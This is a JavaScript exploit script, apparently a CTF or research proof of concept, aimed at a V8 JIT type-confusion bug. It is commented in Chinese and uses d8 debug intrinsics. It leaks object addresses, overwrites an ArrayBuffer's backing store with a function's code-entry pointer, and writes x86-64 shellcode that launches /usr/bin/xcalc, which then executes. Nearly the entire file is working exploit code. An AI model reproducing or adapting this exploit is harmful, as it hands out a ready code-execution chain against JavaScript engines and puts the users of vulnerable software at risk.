var ab = new ArrayBuffer(0x200);
var n;
var m;
var l;


var evil_f = new Function("var a = 1000000");

// int->double
// d2u(intaddr/0x100000000,intaddr&0xffffffff)
function d2u(num1,num2){
    d = new Uint32Array(2);
    d[0] = num2;
    d[1] = num1;
    f = new Float64Array(d.buffer);
    return f[0];
}
// double->int
// u2d(floataddr)
function u2d(num){
    f = new Float64Array(1);
    f[0] = num;
    d = new Uint32Array(f.buffer);
    return d[1] * 0x100000000 + d[0];
}

function Ctor() {
	n = new Set();	
}
function Ctor2() {
	m = new Map();	
}
function Ctor3() {
	l = new ArrayBuffer();
}
function Check(obj){
// oob write empty_Fixed_Array, write object to null_str buffer
    n.xyz = 3.4766863919152113e-308; // do not modify string map
    n.xyz1 = 0x0; // do not modify the value
    n.xyz2 = 0x7000; // enlarge length of builtIn string 'null'
    n.xyz3 = obj; // leak the Object addr
}
// print("0x"+u2d(3.4766863919133141e-308;
// print(d2u(0x0019000400007300/0x100000000,0x0019000400007300&0xffffffff));

function Check2(addr){
	// Oob write empty_Fixed_Array, str buffer value will be treat as a number pointer
	m.xyz = 3.4766863919152113e-308;    // do not modify string map
	m.xyz1 = 0x0                 // do not modify the value
	m.xyz2 = 0x7000 				    // enlarge length of builtIn string 'null'
    m.xyz3 = addr 	
}				
function Check3(addr){
	// Oob write empty_Fixed_Array, str length will be treat as a number pointer 
	l.xyz = 3.4766863919152113e-308;    // do not modify string map
	l.xyz1 = addr  
}


// JIT优化
for(var i=0; i<10000; ++i) {
    Ctor();
    Ctor2();
    Ctor3();
}

for(var i=0; i<10000; ++i) {
    Check(null);
    Check2(3.4766863919152113e-308);
    Check3(3.4766863919152113e-308);
}

Ctor(); // 初始化n
Ctor2(); // 初始化m
Ctor3(); // 初始化l

Check(ab);

%DebugPrint(n);
%SystemBreak();

var str = new String(null);
var ab_addr = str.charCodeAt(0)*0x1+str.charCodeAt(1)*0x100+str.charCodeAt(2)*0x10000+str.charCodeAt(3)*0x1000000+str.charCodeAt(4)*0x100000000+str.charCodeAt(5)*0x10000000000+str.charCodeAt(6)*0x1000000000000+str.charCodeAt(7)*0x100000000000000;
print("0x"+ab_addr.toString(16)); //泄露ArrayBuffer地址
var ab_len_ptr = ab_addr+24; //ArrayBuffer+24是KByteLengthOffset  下一个Word是KBackingStoreOffset 我们要将function写入这里 因为浮点数存在指定地址的下一个Word 所以要泄露BackingStore的上一个Word的地址

ab_len_ptr_float = d2u(ab_len_ptr/0x100000000,ab_len_ptr&0xffffffff);
print("0x"+ab_len_ptr_float.toString(16)); 
Check(evil_f);

%DebugPrint(n);
%SystemBreak();

var func_addr = str.charCodeAt(0)*0x1+str.charCodeAt(1)*0x100+str.charCodeAt(2)*0x10000+str.charCodeAt(3)*0x1000000+str.charCodeAt(4)*0x100000000+str.charCodeAt(5)*0x10000000000+str.charCodeAt(6)*0x1000000000000+str.charCodeAt(7)*0x100000000000000;
print("0x"+func_addr.toString(16));
func_addr = func_addr - 1;//泄露function的地址 要写入KByteLengthOffser
func_addr_float = d2u(func_addr/0x100000000,func_addr&0xffffffff);
print("0x"+func_addr_float.toString(16));





Check(String(null));//将String(null)写入到String(null)--->Value
%DebugPrint(n);
%SystemBreak();

Check2(ab_len_ptr_float);//将KByteLengthOffset地址写入到String(null)--->Hash   因为String(null)--->Value的值已经改为String(null) 所以写入是写到了String(null)+0x8也就是String(null)--->Hash的地方
                         //因为写的是double 所以要写入到所在地方指针的下一个WORD
%DebugPrint(m);
%SystemBreak();

Check3(func_addr_float);//用函数地址覆盖掉BackingStore
%DebugPrint(l);
%SystemBreak();

f64 = new Float64Array(ab); //ArrayBuffer里BackingStore指向的是function
shellcode_addr_float = f64[7];//function[7] = kCodeEntryOffset 找到kCodeEntryOffset
print("0x"+(u2d(shellcode_addr_float)).toString(16));
Check3(shellcode_addr_float);//用kCodeEntryOffset覆盖掉BackingStore
%DebugPrint(l);
%SystemBreak();


// pop /usr/bin/xcalc
var shellcode = new Uint32Array(ab);//ArrayBuffer里BackingStore指向的是kCodeEntryOffset    将shellcode写入到kCodeEntryOffset
shellcode[0] = 0x90909090;
shellcode[1] = 0x90909090;
shellcode[2] = 0x782fb848;
shellcode[3] = 0x636c6163;
shellcode[4] = 0x48500000;
shellcode[5] = 0x73752fb8;
shellcode[6] = 0x69622f72;
shellcode[7] = 0x8948506e;
shellcode[8] = 0xc03148e7;
shellcode[9] = 0x89485750;
shellcode[10] = 0xd23148e6;
shellcode[11] = 0x3ac0c748;
shellcode[12] = 0x50000030;
shellcode[13] = 0x4944b848;
shellcode[14] = 0x414c5053;
shellcode[15] = 0x48503d59;
shellcode[16] = 0x3148e289;
shellcode[17] = 0x485250c0;
shellcode[18] = 0xc748e289;
shellcode[19] = 0x00003bc0;
shellcode[20] = 0x050f00;

evil_f();
